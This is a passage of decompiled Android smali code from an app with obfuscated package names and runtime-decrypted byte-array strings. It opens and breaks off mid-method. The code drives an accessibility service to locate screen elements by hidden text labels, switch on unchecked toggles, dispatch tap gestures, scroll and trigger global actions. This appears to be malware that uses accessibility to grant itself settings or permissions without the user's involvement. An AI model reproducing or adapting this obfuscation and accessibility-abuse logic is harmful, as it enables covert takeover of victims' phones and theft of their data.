    invoke-static {v0, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/4 v3, 0x1

    if-eqz v0, :cond_1

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    invoke-static {v1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-virtual {v0, v3}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    goto :goto_1

    :cond_1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v4, 0x25

    new-array v4, v4, [B

    fill-array-data v4, :array_4

    new-array v2, v2, [B

    fill-array-data v2, :array_5

    invoke-static {v4, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->d(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    if-eqz v0, :cond_2

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v2

    if-lez v2, :cond_2

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v2

    sub-int/2addr v2, v3

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    goto :goto_0

    :cond_2
    :goto_2
    return-void

    nop

    :array_0
    .array-data 1
        0x73t
        -0x11t
        -0x38t
        -0x51t
        0x32t
        0x70t
        -0x3et
        -0x56t
        0x3et
        -0xdt
        -0x40t
        -0x1et
        0x2at
        0x6bt
        -0x22t
        -0x49t
        0x69t
        -0x1dt
        -0x40t
        -0x11t
        0x2bt
        0x7ct
        -0x3bt
        -0x7t
        0x79t
        -0x1ct
        -0x76t
        -0xet
        0x3at
        0x75t
        -0x2et
        -0x60t
        0x64t
        -0x21t
        -0x3ct
        -0x13t
        0x33t
        0x76t
        -0x40t
    .end array-data

    :array_1
    .array-data 1
        0x10t
        -0x80t
        -0x5bt
        -0x7ft
        0x5ft
        0x19t
        -0x49t
        -0x3dt
    .end array-data

    :array_2
    .array-data 1
        -0x20t
        -0x6at
        -0x7at
        -0x36t
        -0x34t
        0x5at
        0x34t
        0x9t
        -0x53t
        -0x76t
        -0x72t
        -0x79t
        -0x2ct
        0x41t
        0x28t
        0x14t
        -0x6t
        -0x66t
        -0x72t
        -0x76t
        -0x2bt
        0x56t
        0x33t
        0x5at
        -0x16t
        -0x63t
        -0x3ct
        -0x6ct
        -0x3ct
        0x41t
        0x2ct
        0x9t
        -0x10t
        -0x76t
        -0x7et
        -0x75t
        -0x31t
        0x6ct
        0x20t
        0xct
        -0xct
        -0x68t
        -0x6et
        -0x69t
    .end array-data

    :array_3
    .array-data 1
        -0x7dt
        -0x7t
        -0x15t
        -0x1ct
        -0x5ft
        0x33t
        0x41t
        0x60t
    .end array-data

    :array_4
    .array-data 1
        -0x7bt
        -0x6t
        0x7ft
        0x63t
        -0xdt
        0x73t
        0x78t
        0x18t
        -0x38t
        -0x1at
        0x77t
        0x2et
        -0x15t
        0x68t
        0x64t
        0x5t
        -0x61t
        -0xat
        0x77t
        0x23t
        -0x16t
        0x7ft
        0x7ft
        0x4bt
        -0x71t
        -0xft
        0x3dt
        0x24t
        -0x16t
        0x7ft
        0x60t
        0x2et
        -0x7ft
        -0x19t
        0x7dt
        0x38t
        -0x12t
    .end array-data

    nop

    :array_5
    .array-data 1
        -0x1at
        -0x6bt
        0x12t
        0x4dt
        -0x62t
        0x1at
        0xdt
        0x71t
    .end array-data
.end method

.method private static synthetic K2()V
    .locals 0

    .line 1
    return-void
.end method

.method public static synthetic L(Landroid/os/Handler;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->b2(Landroid/os/Handler;)V

    return-void
.end method

.method private static L0(Landroid/view/accessibility/AccessibilityNodeInfo;Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ui;)V
    .locals 7

    .line 1
    if-nez p0, :cond_0

    return-void

    :cond_0
    new-instance v1, Landroid/graphics/Path;

    invoke-direct {v1}, Landroid/graphics/Path;-><init>()V

    new-instance v0, Landroid/graphics/Rect;

    invoke-direct {v0}, Landroid/graphics/Rect;-><init>()V

    invoke-virtual {p0, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    invoke-virtual {v0}, Landroid/graphics/Rect;->isEmpty()Z

    move-result p0

    if-nez p0, :cond_2

    iget p0, v0, Landroid/graphics/Rect;->left:I

    if-ltz p0, :cond_2

    iget p0, v0, Landroid/graphics/Rect;->top:I

    if-gez p0, :cond_1

    goto :goto_0

    :cond_1
    invoke-virtual {v0}, Landroid/graphics/Rect;->centerX()I

    move-result p0

    const/4 v2, 0x0

    invoke-static {v2, p0}, Ljava/lang/Math;->max(II)I

    move-result p0

    invoke-virtual {v0}, Landroid/graphics/Rect;->centerY()I

    move-result v0

    invoke-static {v2, v0}, Ljava/lang/Math;->max(II)I

    move-result v0

    int-to-float p0, p0

    int-to-float v0, v0

    invoke-virtual {v1, p0, v0}, Landroid/graphics/Path;->moveTo(FF)V

    new-instance p0, Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-direct {p0}, Landroid/accessibilityservice/GestureDescription$Builder;-><init>()V

    new-instance v6, Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    const-wide/16 v2, 0xa

    const-wide/16 v4, 0x32

    move-object v0, v6

    invoke-direct/range {v0 .. v5}, Landroid/accessibilityservice/GestureDescription$StrokeDescription;-><init>(Landroid/graphics/Path;JJ)V

    invoke-virtual {p0, v6}, Landroid/accessibilityservice/GestureDescription$Builder;->addStroke(Landroid/accessibilityservice/GestureDescription$StrokeDescription;)Landroid/accessibilityservice/GestureDescription$Builder;

    move-result-object p0

    invoke-virtual {p0}, Landroid/accessibilityservice/GestureDescription$Builder;->build()Landroid/accessibilityservice/GestureDescription;

    move-result-object p0

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    new-instance v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$v;

    invoke-direct {v1, p1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$v;-><init>(Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ui;)V

    const/4 p1, 0x0

    invoke-virtual {v0, p0, v1, p1}, Landroid/accessibilityservice/AccessibilityService;->dispatchGesture(Landroid/accessibilityservice/GestureDescription;Landroid/accessibilityservice/AccessibilityService$GestureResultCallback;Landroid/os/Handler;)Z

    return-void

    :cond_2
    :goto_0
    const/16 p0, 0xc

    new-array p0, p0, [B

    fill-array-data p0, :array_0

    const/16 p1, 0x8

    new-array v1, p1, [B

    fill-array-data v1, :array_1

    invoke-static {p0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    new-instance p0, Ljava/lang/StringBuilder;

    invoke-direct {p0}, Ljava/lang/StringBuilder;-><init>()V

    const/16 v1, 0x15

    new-array v1, v1, [B

    fill-array-data v1, :array_2

    new-array p1, p1, [B

    fill-array-data p1, :array_3

    invoke-static {v1, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Landroid/graphics/Rect;->toShortString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    return-void

    nop

    :array_0
    .array-data 1
        0x6t
        -0x66t
        0x72t
        0x4dt
        -0x1ct
        -0x61t
        0x5dt
        -0x3t
        0x33t
        -0x73t
        0x6et
        0x4bt
    .end array-data

    :array_1
    .array-data 1
        0x41t
        -0x1t
        0x1t
        0x39t
        -0x6ft
        -0x13t
        0x38t
        -0x48t
    .end array-data

    :array_2
    .array-data 1
        -0x7dt
        -0x2ct
        -0x25t
        -0x75t
        0x23t
        0x4t
        -0x6t
        -0x2ct
        -0x5ct
        -0x2bt
        -0x37t
        -0x71t
        0x6ft
        0xft
        -0xft
        -0x7ft
        -0x5ct
        -0x22t
        -0x22t
        -0x30t
        0x6ft
    .end array-data

    nop

    :array_3
    .array-data 1
        -0x36t
        -0x46t
        -0x53t
        -0x16t
        0x4ft
        0x6dt
        -0x62t
        -0xct
    .end array-data
.end method

.method private static L1(I)V
    .locals 5

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->O:Ljava/lang/String;

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->c(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_2

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    if-eqz p0, :cond_0

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v0

    add-int/lit8 v0, v0, -0x1

    invoke-virtual {p0, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isCheckable()Z

    move-result v1

    if-eqz v1, :cond_0

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isChecked()Z

    move-result v0

    if-nez v0, :cond_0

    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    const/16 p0, 0x1f4

    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    :cond_0
    new-instance p0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v0

    invoke-direct {p0, v0}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    const/4 v0, 0x0

    :goto_0
    const/4 v1, 0x2

    if-ge v0, v1, :cond_1

    mul-int/lit16 v1, v0, 0x1f4

    new-instance v2, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/j00;

    invoke-direct {v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/j00;-><init>()V

    int-to-long v3, v1

    invoke-virtual {p0, v2, v3, v4}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    :cond_1
    new-instance p0, Landroid/os/Handler;

    invoke-direct {p0}, Landroid/os/Handler;-><init>()V

    new-instance v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$f;

    invoke-direct {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$f;-><init>()V

    const-wide/16 v1, 0x5dc

    invoke-virtual {p0, v0, v1, v2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    goto :goto_1

    :cond_2
    if-lez p0, :cond_3

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v1, 0x1f

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v2, v2, [B

    fill-array-data v2, :array_1

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_3

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isScrollable()Z

    move-result v1

    if-eqz v1, :cond_3

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->b3(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    const/16 v0, 0x12c

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    add-int/lit8 p0, p0, -0x1

    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->L1(I)V

    :cond_3
    :goto_1
    return-void

    nop

    :array_0
    .array-data 1
        -0x75t
        0xat
        -0x41t
        -0x78t
        0x70t
        -0x65t
        -0x1at
        0x1dt
        -0x3at
        0x16t
        -0x49t
        -0x3bt
        0x68t
        -0x80t
        -0x6t
        0x0t
        -0x6ft
        0x6t
        -0x49t
        -0x38t
        0x69t
        -0x69t
        -0x1ft
        0x4et
        -0x7ft
        0x1t
        -0x3t
        -0x36t
        0x74t
        -0x7ft
        -0x19t
    .end array-data

    :array_1
    .array-data 1
        -0x18t
        0x65t
        -0x2et
        -0x5at
        0x1dt
        -0xet
        -0x6dt
        0x74t
    .end array-data
.end method

.method private static synthetic L2()V
    .locals 0

    .line 1
    return-void
.end method

.method public static synthetic M(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 0

    .line 1
    invoke-static {p0, p1, p2, p3, p4}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->w2(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    return-void
.end method

.method private static M0(ILjava/util/List;Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v9;)V
    .locals 5

    .line 1
    filled-new-array {p0}, [I

    move-result-object p0

    invoke-interface {p1}, Ljava/util/List;->size()I

    move-result v0

    const/4 v1, 0x0

    aget v2, p0, v1

    const/4 v3, 0x1

    if-ge v2, v0, :cond_1

    invoke-interface {p1, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-eqz v2, :cond_2

    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->isChecked()Z

    move-result v4

    if-nez v4, :cond_0

    new-instance v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$w;

    invoke-direct {v1, p0, v0, p1, p2}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$w;-><init>([IILjava/util/List;Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v9;)V

    invoke-static {v2, v1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->L0(Landroid/view/accessibility/AccessibilityNodeInfo;Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ui;)V

    goto :goto_0

    :cond_0
    aget v2, p0, v1

    if-ge v2, v0, :cond_2

    add-int/2addr v2, v3

    aput v2, p0, v1

    invoke-static {v2, p1, p2}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->M0(ILjava/util/List;Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v9;)V

    goto :goto_0

    :cond_1
    invoke-interface {p2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v9;->a(Z)V

    :cond_2
    :goto_0
    return-void
.end method

.method private static M1(I)V
    .locals 3

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->O:Ljava/lang/String;

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->c(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_1

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    if-eqz p0, :cond_0

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    goto :goto_0

    :cond_0
    const/4 p0, 0x0

    :goto_0
    if-eqz p0, :cond_2

    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    const/16 p0, 0x1f4

    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->j1()V

    goto :goto_1

    :cond_1
    if-lez p0, :cond_2

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v1, 0x22

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v2, v2, [B

    fill-array-data v2, :array_1

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_2

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isScrollable()Z

    move-result v1

    if-eqz v1, :cond_2

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->b3(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    const/16 v0, 0x12c

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    add-int/lit8 p0, p0, -0x1

    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->M1(I)V

    :cond_2
    :goto_1
    return-void

    :array_0
    .array-data 1
        -0x13t
        -0x4et
        -0x76t
        -0x33t
        0x20t
        0x33t
        -0x6at
        0x1dt
        -0x3t
        -0xdt
        -0x7bt
        -0x7et
        0x3bt
        0x37t
        -0x61t
        0x1at
        -0x9t
        -0x19t
        -0x72t
        -0x79t
        0x60t
        0x31t
        -0x61t
        0xbt
        -0x9t
        -0x42t
        -0x75t
        -0x7at
        0x3dt
        0x1ct
        -0x74t
        0x1t
        -0x15t
        -0x56t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x72t
        -0x23t
        -0x19t
        -0x1dt
        0x4ft
        0x43t
        -0x6t
        0x68t
    .end array-data
.end method

.method private static synthetic M2()V
    .locals 0

    .line 1
    return-void
.end method

.method public static synthetic N(Landroid/content/Context;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->s2(Landroid/content/Context;)V

    return-void
.end method

.method private static N0(Landroid/view/accessibility/AccessibilityNodeInfo;)V
    .locals 1

    .line 1
    if-eqz p0, :cond_0

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isCheckable()Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isChecked()Z

    move-result v0

    if-nez v0, :cond_0

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v0

    if-eqz v0, :cond_0

    const/16 v0, 0x10

    invoke-virtual {p0, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    :cond_0
    return-void
.end method

.method private static N1()V
    .locals 16

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_3

    const/4 v1, 0x6

    new-array v2, v1, [B

    fill-array-data v2, :array_0

    const/16 v3, 0x8

    new-array v4, v3, [B

    fill-array-data v4, :array_1

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    new-array v2, v1, [B

    fill-array-data v2, :array_2

    new-array v4, v3, [B

    fill-array-data v4, :array_3

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    const/4 v2, 0x4

    new-array v4, v2, [B

    fill-array-data v4, :array_4

    new-array v7, v3, [B

    fill-array-data v7, :array_5

    invoke-static {v4, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v7

    const/16 v4, 0x9

    new-array v4, v4, [B

    fill-array-data v4, :array_6

    new-array v8, v3, [B

    fill-array-data v8, :array_7

    invoke-static {v4, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v8

    const/16 v4, 0xc

    new-array v9, v4, [B

    fill-array-data v9, :array_8

    new-array v10, v3, [B

    fill-array-data v10, :array_9

    invoke-static {v9, v10}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v9

    const/4 v10, 0x5

    new-array v11, v10, [B

    fill-array-data v11, :array_a

    new-array v12, v3, [B

    fill-array-data v12, :array_b

    invoke-static {v11, v12}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v11

    new-array v10, v10, [B

    fill-array-data v10, :array_c

    new-array v12, v3, [B

    fill-array-data v12, :array_d

    invoke-static {v10, v12}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v12

    const/16 v10, 0xd

    new-array v10, v10, [B

    fill-array-data v10, :array_e

    new-array v13, v3, [B

    fill-array-data v13, :array_f

    invoke-static {v10, v13}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v13

    new-array v10, v1, [B

    fill-array-data v10, :array_10

    new-array v14, v3, [B

    fill-array-data v14, :array_11

    invoke-static {v10, v14}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v14

    new-array v4, v4, [B

    fill-array-data v4, :array_12

    new-array v10, v3, [B

    fill-array-data v10, :array_13

    invoke-static {v4, v10}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    new-array v1, v1, [B

    fill-array-data v1, :array_14

    new-array v10, v3, [B

    fill-array-data v10, :array_15

    invoke-static {v1, v10}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v15

    move-object v10, v11

    move-object v11, v12

    move-object v12, v13

    move-object v13, v14

    move-object v14, v4

    filled-new-array/range {v5 .. v15}, [Ljava/lang/String;

    move-result-object v1

    const/4 v4, 0x0

    :goto_0
    const/16 v5, 0xb

    if-ge v4, v5, :cond_3

    aget-object v5, v1, v4

    invoke-virtual {v0, v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v6

    if-eqz v6, :cond_1

    invoke-interface {v6}, Ljava/util/List;->isEmpty()Z

    move-result v7

    if-nez v7, :cond_1

    invoke-interface {v6}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v6

    :cond_0
    :goto_1
    invoke-interface {v6}, Ljava/util/Iterator;->hasNext()Z

    move-result v7

    if-eqz v7, :cond_2

    invoke-interface {v6}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v8

    if-eqz v8, :cond_0

    invoke-virtual {v5, v8}, Ljava/lang/String;->contentEquals(Ljava/lang/CharSequence;)Z

    move-result v8

    if-eqz v8, :cond_0

    new-instance v8, Landroid/graphics/Rect;

    invoke-direct {v8}, Landroid/graphics/Rect;-><init>()V

    invoke-virtual {v7, v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    invoke-static {v7}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g1(Landroid/view/accessibility/AccessibilityNodeInfo;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v7

    if-eqz v7, :cond_0

